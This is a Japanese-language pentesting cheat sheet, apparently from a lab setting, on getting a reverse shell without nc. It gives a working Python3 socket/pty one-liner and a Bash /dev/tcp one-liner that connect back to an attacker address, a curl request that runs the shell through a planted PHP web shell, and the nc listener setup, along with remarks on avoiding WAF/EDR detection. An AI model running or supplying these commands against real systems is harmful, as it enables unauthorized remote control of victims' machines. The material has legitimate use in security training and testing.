# 全体の目的


ターゲット側から攻撃者（192.168.49.57）へ接続させて
**シェルを奪う（リバースシェル）**ための代替手段。
# なぜ「ncが使えない場合」なのか

よくある制約：

* `nc` が入っていない
* BusyBoxで機能制限
* `-e` オプション無効（最近多い）
* WAFやEDRで検知されやすい

👉 だから
**標準ツール（Python / Bash）で代替する**

---

# Python3版
```bash
python3 -c "import socket,os,pty;
s=socket.socket();
s.connect(('192.168.49.57',1234));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn('/bin/sh')"
```

### 処理フロー
1. `socket.socket()`
   → TCPソケット作成
2. `connect(('192.168.49.57',1234))`
   → 攻撃者側へ接続
3. `os.dup2()`
   → 標準入出力をソケットにリダイレクト
   * 0 = stdin
   * 1 = stdout
   * 2 = stderr
1. `pty.spawn('/bin/sh')`
   → 擬似端末付きシェル（操作しやすくなる）

---

## URL版（Webシェル経由）

```bash
curl http://192.168.57.29:8089/.../simple-backdoor.php?cmd=python3 -c '...'
```

### 意図
* `simple-backdoor.php` にコマンド注入
* その中で Python リバースシェルを実行

👉 つまり
**RCE（リモートコード実行） → リバースシェル昇格**

---

# Bash版

```bash
bash -i >& /dev/tcp/192.168.49.57/443 0>&1
```

### 仕組み
* `/dev/tcp/host/port` → Bashの擬似TCP機能
* `>&` → stdout/stderrを送信
* `0>&1` → stdinも接続

👉 Python不要でシンプル
👉 ただし **/dev/tcp が有効なbash限定**

---

# 実務的な使い分け

| 方法              | 条件        | 安定性 |
| --------------- | --------- | --- |
| Python          | python3あり | 高   |
| Bash (/dev/tcp) | bash対応    | 中   |
| nc              | フル機能あり    | 高   |

---

# 補足（攻撃側準備）

```bash
nc -lvnp 1234
```

または
```bash
rlwrap nc -lvnp 1234
```

👉 受け側がないと成立しない

---
